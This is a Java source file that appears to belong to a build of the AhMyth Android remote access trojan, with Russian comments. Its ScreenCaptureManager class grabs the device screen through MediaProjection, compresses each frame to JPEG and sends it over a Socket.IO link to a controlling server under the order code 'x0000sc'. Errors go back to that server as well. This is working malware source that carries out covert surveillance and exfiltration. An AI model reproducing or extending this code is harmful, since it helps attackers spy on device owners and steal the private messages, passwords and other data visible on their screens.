package ahmyth.mine.king.ahmyth;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.HardwareBuffer;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.util.DisplayMetrics;
import android.util.Log;
import ahmyth.mine.king.ahmyth.AppLogger;
import ahmyth.mine.king.ahmyth.Constants;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

/**
 * ScreenCaptureManager - управляет захватом экрана через MediaProjection API
 * Требует Android 5.0+ (API 21+), но оптимизирован для Android 8.0+ (API 26+)
 */
public class ScreenCaptureManager {

    private static final String TAG = "ScreenCaptureManager";
    private static final int IMAGE_READER_FORMAT = PixelFormat.RGBA_8888;
    private static final int MAX_IMAGES = 1;

    private Context context;
    private MediaProjection mediaProjection;
    private MediaProjectionManager projectionManager;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private int screenWidth;
    private int screenHeight;
    private int screenDensity;
    private boolean isCapturing = false;
    private int frameSkipCount = 0; // Счетчик пропущенных кадров

    private static ScreenCaptureManager instance;

    private ScreenCaptureManager(Context context) {
        this.context = context;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            projectionManager = (MediaProjectionManager) context.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        }
        initializeScreenMetrics();
    }

    public static synchronized ScreenCaptureManager getInstance(Context context) {
        if (instance == null) {
            instance = new ScreenCaptureManager(context);
        }
        return instance;
    }

    /**
     * Инициализация метрик экрана
     */
    private void initializeScreenMetrics() {
        DisplayMetrics metrics = context.getResources().getDisplayMetrics();
        screenWidth = metrics.widthPixels;
        screenHeight = metrics.heightPixels;
        screenDensity = metrics.densityDpi;
    }

    /**
     * Установка MediaProjection (должен быть вызван после получения разрешения)
     * @param mediaProjection экземпляр MediaProjection
     */
    public void setMediaProjection(MediaProjection mediaProjection) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            AppLogger.e(TAG, "MediaProjection requires Android 5.0+");
            return;
        }
        this.mediaProjection = mediaProjection;
    }

    /**
     * Проверка наличия активного MediaProjection
     */
    public boolean hasMediaProjection() {
        return mediaProjection != null;
    }

    /**
     * Захват скриншота экрана
     * Выполняется асинхронно, результат отправляется через IOSocket
     */
    public void captureScreen() {
        AppLogger.d(TAG, "=== captureScreen() called ===");
        
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            AppLogger.e(TAG, "ERROR: Screen capture requires Android 5.0+");
            sendError("Screen capture requires Android 5.0+");
            return;
        }

        if (mediaProjection == null) {
            AppLogger.e(TAG, "ERROR: MediaProjection is NULL!");
            sendError("MediaProjection permission not granted");
            return;
        }
        AppLogger.d(TAG, "MediaProjection OK");

        if (isCapturing) {
            AppLogger.d(TAG, "WARNING: Screen capture already in progress");
            return;
        }

        // Убеждаемся, что старые ресурсы полностью очищены
        if (imageReader != null || virtualDisplay != null) {
            AppLogger.d(TAG, "WARNING: Old resources still exist, cleaning up...");
            cleanup();
        }
        
        isCapturing = true;
        frameSkipCount = 0; // Сбрасываем счетчик кадров
        AppLogger.d(TAG, "isCapturing set to true, frameSkipCount reset to 0");

        try {
            AppLogger.d(TAG, "Screen dimensions: " + screenWidth + "x" + screenHeight + ", density: " + screenDensity);
            
            // Создаем ImageReader для получения кадров
            imageReader = ImageReader.newInstance(screenWidth, screenHeight, IMAGE_READER_FORMAT, MAX_IMAGES);
            AppLogger.d(TAG, "ImageReader created: " + screenWidth + "x" + screenHeight);
            
            // ВАЖНО: Устанавливаем слушатель ДО создания VirtualDisplay
            // чтобы не пропустить первые кадры
            imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                @Override
                public void onImageAvailable(ImageReader reader) {
                    AppLogger.d(TAG, "=== onImageAvailable() CALLED ===");
                    AppLogger.d(TAG, "isCapturing: " + isCapturing);
                    
                    // Если захват уже завершён, игнорируем этот вызов
                    if (!isCapturing) {
                        AppLogger.d(TAG, "Capture already completed, ignoring onImageAvailable()");
                        return;
                    }
                    
                    Image image = null;
                    try {
                        image = reader.acquireLatestImage();
                        if (image != null) {
                            AppLogger.d(TAG, "Image acquired: width=" + image.getWidth() + ", height=" + image.getHeight());
                            
                            // Пропускаем первые кадры (обычно пустые/черные)
                            frameSkipCount++;
                            AppLogger.d(TAG, "Frame number: " + frameSkipCount);
                            
                            // Пропускаем первые 2 кадра для стабильности
                            // Первый кадр обычно пустой, второй может быть частично пустым
                            if (frameSkipCount < Constants.INITIAL_FRAMES_TO_SKIP) {
                                AppLogger.d(TAG, "Skipping frame " + frameSkipCount + " (first frames are usually empty)");
                                image.close();
                                image = null;
                                // НЕ вызываем cleanup() здесь - VirtualDisplay должен остаться активным
                                return; // Ждём следующий кадр
                            }
                            
                            // Сразу сбрасываем флаг, чтобы предотвратить повторную обработку
                            isCapturing = false;
                            
                            Bitmap bitmap = imageToBitmap(image);
                            if (bitmap != null) {
                                AppLogger.d(TAG, "Bitmap created: " + bitmap.getWidth() + "x" + bitmap.getHeight());
                                sendScreenshot(bitmap);
                                // После успешной отправки очищаем ресурсы
                                cleanup();
                            } else {
                                AppLogger.e(TAG, "ERROR: Failed to convert image to bitmap");
                                sendError("Failed to convert image to bitmap");
                                cleanup();
                            }
                        } else {
                            // NULL изображение может быть нормальным, если это второй вызов после успешного захвата
                            if (isCapturing) {
                                AppLogger.e(TAG, "ERROR: acquireLatestImage() returned NULL while capturing");
                                sendError("Failed to acquire image");
                                cleanup();
                            } else {
                                AppLogger.d(TAG, "acquireLatestImage() returned NULL (capture already completed)");
                            }
                        }
                    } catch (Exception e) {
                        AppLogger.e(TAG, "ERROR processing image", e);
                        e.printStackTrace();
                        sendError("Error processing image: " + e.getMessage());
                        cleanup();
                    } finally {
                        if (image != null) {
                            image.close();
                            AppLogger.d(TAG, "Image closed");
                        }
                        // НЕ вызываем cleanup() здесь - только закрываем изображение
                        // cleanup() вызывается только после успешного захвата или ошибки
                    }
                }
            }, new android.os.Handler(android.os.Looper.getMainLooper()));
            
            AppLogger.d(TAG, "OnImageAvailableListener set BEFORE VirtualDisplay creation");
            
            // Создаем VirtualDisplay для захвата экрана
            virtualDisplay = mediaProjection.createVirtualDisplay(
                    "ScreenCapture",
                    screenWidth,
                    screenHeight,
                    screenDensity,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader.getSurface(),
                    null,
                    null
            );
            
            if (virtualDisplay == null) {
                AppLogger.e(TAG, "ERROR: VirtualDisplay is NULL!");
                sendError("Failed to create VirtualDisplay");
                cleanup();
                return;
            }
            AppLogger.d(TAG, "VirtualDisplay created successfully");
            AppLogger.d(TAG, "Waiting for image... (listener is already set)");

            // Таймаут для захвата (5 секунд)
            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(new Runnable() {
                @Override
                public void run() {
                    // Проверяем, не был ли уже выполнен захват
                    if (isCapturing && virtualDisplay != null) {
                        AppLogger.e(TAG, "=== SCREEN CAPTURE TIMEOUT ===");
                        AppLogger.e(TAG, "onImageAvailable() was NOT called within 5 seconds");
                        sendError("Screen capture timeout");
                        cleanup();
                        isCapturing = false;
                    }
                }
            }, Constants.SCREEN_CAPTURE_TIMEOUT_MS);

        } catch (Exception e) {
            AppLogger.e(TAG, "Error setting up screen capture", e);
            sendError("Error setting up screen capture: " + e.getMessage());
            cleanup();
        }
    }

    /**
     * Преобразование Image в Bitmap
     * ImageReader с RGBA_8888 возвращает данные в формате RGBA, нужно конвертировать в ARGB
     */
    private Bitmap imageToBitmap(Image image) {
        AppLogger.d(TAG, "=== imageToBitmap() called ===");
        try {
            // Для Android 8.0 (API 26) и выше используем HardwareBuffer для оптимизации
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                AppLogger.d(TAG, "Using HardwareBuffer for image conversion (API >= 26)");
                try (HardwareBuffer hardwareBuffer = image.getHardwareBuffer()) {
                    if (hardwareBuffer != null) {
                        return Bitmap.wrapHardwareBuffer(hardwareBuffer, null);
                    } else {
                        AppLogger.e(TAG, "ERROR: HardwareBuffer is NULL!");
                        return null;
                    }
                }
            } else {
                AppLogger.d(TAG, "Using manual ByteBuffer conversion (API < 26)");
                Image.Plane[] planes = image.getPlanes();
                AppLogger.d(TAG, "Image planes count: " + planes.length);
                
                if (planes.length == 0) {
                    AppLogger.e(TAG, "ERROR: Image has no planes!");
                    return null;
                }
                
                ByteBuffer buffer = planes[0].getBuffer();
                int pixelStride = planes[0].getPixelStride();
                int rowStride = planes[0].getRowStride();
                int rowPadding = rowStride - pixelStride * screenWidth;
                
                AppLogger.d(TAG, "Image plane 0: pixelStride=" + pixelStride + ", rowStride=" + rowStride + ", padding=" + rowPadding);
                AppLogger.d(TAG, "Buffer capacity: " + buffer.capacity());
                AppLogger.d(TAG, "Image format: " + image.getFormat());
                
                // Создаём bitmap правильного размера
                int bitmapWidth = screenWidth;
                int bitmapHeight = screenHeight;
                
                // Если есть padding, создаём bitmap с учётом padding
                if (rowPadding > 0) {
                    bitmapWidth = screenWidth + rowPadding / pixelStride;
                }
                
                // Создаём массив пикселей для конвертации
                int[] pixels = new int[bitmapWidth * bitmapHeight];
                
                // Копируем все байты из ByteBuffer в массив
                buffer.rewind();
                byte[] bufferArray = new byte[buffer.remaining()];
                buffer.get(bufferArray);
                buffer.rewind();
                
                AppLogger.d(TAG, "Buffer array size: " + bufferArray.length);
                
                // Читаем пиксели напрямую из массива байтов
                for (int y = 0; y < bitmapHeight; y++) {
                    for (int x = 0; x < bitmapWidth; x++) {
                        int bufferOffset = y * rowStride + x * pixelStride;
                        if (bufferOffset + 3 < bufferArray.length) {
                            // Читаем RGBA байты (порядок: R, G, B, A)
                            int r = bufferArray[bufferOffset] & 0xFF;
                            int g = bufferArray[bufferOffset + 1] & 0xFF;
                            int b = bufferArray[bufferOffset + 2] & 0xFF;
                            int a = bufferArray[bufferOffset + 3] & 0xFF;
                            
                            // Конвертируем RGBA в ARGB (Android Bitmap формат: A, R, G, B)
                            int pixel = (a << 24) | (r << 16) | (g << 8) | b;
                            pixels[y * bitmapWidth + x] = pixel;
                        } else {
                            // Если выходим за границы, ставим прозрачный пиксель
                            pixels[y * bitmapWidth + x] = 0x00000000;
                        }
                    }
                }
                
                // Проверяем первые несколько пикселей для отладки
                if (pixels.length > 0) {
                    AppLogger.d(TAG, "First pixel (before bitmap): 0x" + Integer.toHexString(pixels[0]));
                    if (pixels.length > 1) {
                        AppLogger.d(TAG, "Second pixel: 0x" + Integer.toHexString(pixels[1]));
                    }
                    // Проверяем несколько пикселей в середине и конце
                    int midPixel = pixels.length / 2;
                    int lastPixel = pixels.length - 1;
                    AppLogger.d(TAG, "Mid pixel (" + midPixel + "): 0x" + Integer.toHexString(pixels[midPixel]));
                    AppLogger.d(TAG, "Last pixel (" + lastPixel + "): 0x" + Integer.toHexString(pixels[lastPixel]));
                    
                    // Проверяем, что не все пиксели чёрные
                    int nonBlackPixels = 0;
                    for (int i = 0; i < Math.min(100, pixels.length); i++) {
                        if ((pixels[i] & 0x00FFFFFF) != 0) { // Проверяем RGB (игнорируем alpha)
                            nonBlackPixels++;
                        }
                    }
                    AppLogger.d(TAG, "Non-black pixels in first 100: " + nonBlackPixels);
                }
                
                AppLogger.d(TAG, "Pixels converted from RGBA to ARGB");
                
                // Создаём bitmap из массива пикселей
                Bitmap bitmap = Bitmap.createBitmap(pixels, bitmapWidth, bitmapHeight, Bitmap.Config.ARGB_8888);
                AppLogger.d(TAG, "Bitmap created: " + bitmap.getWidth() + "x" + bitmap.getHeight());
                
                // Проверяем, что bitmap не пустой (проверяем первый пиксель)
                int firstPixel = bitmap.getPixel(0, 0);
                AppLogger.d(TAG, "First pixel color: 0x" + Integer.toHexString(firstPixel));
                if (firstPixel == 0xFF000000) {
                    AppLogger.d(TAG, "WARNING: First pixel is black (0xFF000000)");
                }
                
                // Обрезаем bitmap до правильного размера, если есть padding
                if (rowPadding > 0 && bitmapWidth > screenWidth) {
                    AppLogger.d(TAG, "Cropping bitmap to remove padding");
                    Bitmap croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, screenWidth, screenHeight);
                    bitmap.recycle();
                    return croppedBitmap;
                }
                
                return bitmap;
            }
        } catch (Exception e) {
            AppLogger.e(TAG, "ERROR in imageToBitmap", e);
            e.printStackTrace();
            return null;
        }
    }

    /**
     * Отправка скриншота через IOSocket (использует тот же формат, что и CameraManager)
     */
    private void sendScreenshot(Bitmap bitmap) {
        AppLogger.d(TAG, "=== sendScreenshot() called ===");
        
        if (bitmap == null) {
            AppLogger.e(TAG, "ERROR: Bitmap is NULL!");
            sendError("Bitmap is null");
            return;
        }
        
        AppLogger.d(TAG, "Bitmap size: " + bitmap.getWidth() + "x" + bitmap.getHeight());
        
        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            // Используем тот же уровень сжатия, что и для камеры (20%)
            boolean compressed = bitmap.compress(Bitmap.CompressFormat.JPEG, Constants.JPEG_COMPRESSION_QUALITY, bos);
            AppLogger.d(TAG, "JPEG compression result: " + compressed);
            
            byte[] buffer = bos.toByteArray();
            AppLogger.d(TAG, "Compressed buffer size: " + buffer.length + " bytes");
            
            if (buffer.length == 0) {
                AppLogger.e(TAG, "ERROR: Compressed buffer is EMPTY!");
                sendError("Compressed buffer is empty");
                return;
            }
            
            // Проверяем, что это валидный JPEG (должен начинаться с FF D8)
            if (buffer.length >= 2) {
                int firstByte = buffer[0] & 0xFF;
                int secondByte = buffer[1] & 0xFF;
                AppLogger.d(TAG, "JPEG header: 0x" + Integer.toHexString(firstByte) + " 0x" + Integer.toHexString(secondByte));
                if (firstByte != 0xFF || secondByte != 0xD8) {
                    AppLogger.d(TAG, "WARNING: Buffer does not start with JPEG header (FF D8)!");
                }
            }
            
            JSONObject object = new JSONObject();
            object.put("image", true);
            object.put("buffer", buffer);
            AppLogger.d(TAG, "JSON object created with buffer size: " + buffer.length);
            
            io.socket.client.Socket socket = IOSocket.getInstance().getIoSocket();
            if (socket == null) {
                AppLogger.e(TAG, "ERROR: Socket is NULL!");
                sendError("Socket is null");
                return;
            }
            
            boolean connected = socket.connected();
            AppLogger.d(TAG, "Socket connected: " + connected);
            
            if (!connected) {
                AppLogger.e(TAG, "ERROR: Socket is NOT connected!");
                sendError("Socket not connected");
                return;
            }
            
            socket.emit(Constants.ORDER_SCREEN_CAPTURE, object);
            AppLogger.d(TAG, "=== Screenshot sent via Socket.IO emit('x0000sc') ===");
            AppLogger.d(TAG, "Buffer size sent: " + buffer.length + " bytes");
            
        } catch (JSONException e) {
            AppLogger.e(TAG, "Error creating JSON for screenshot", e);
            e.printStackTrace();
            sendError("Error creating JSON: " + e.getMessage());
        } catch (Exception e) {
            AppLogger.e(TAG, "Unexpected error in sendScreenshot", e);
            e.printStackTrace();
            sendError("Unexpected error: " + e.getMessage());
        } finally {
            if (bitmap != null) {
                bitmap.recycle();
                AppLogger.d(TAG, "Bitmap recycled");
            }
        }
    }

    /**
     * Отправка ошибки на сервер
     */
    private void sendError(String errorMessage) {
        try {
            JSONObject object = new JSONObject();
            object.put("error", true);
            object.put("message", errorMessage);
            IOSocket.getInstance().getIoSocket().emit(Constants.ORDER_SCREEN_CAPTURE, object);
        } catch (JSONException e) {
            AppLogger.e(TAG, "Error sending error message", e);
        }
    }

    /**
     * Очистка ресурсов
     */
    private void cleanup() {
        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
        isCapturing = false;
    }

    /**
     * Освобождение всех ресурсов
     */
    public void release() {
        cleanup();
        if (mediaProjection != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            mediaProjection.stop();
            mediaProjection = null;
        }
    }
}
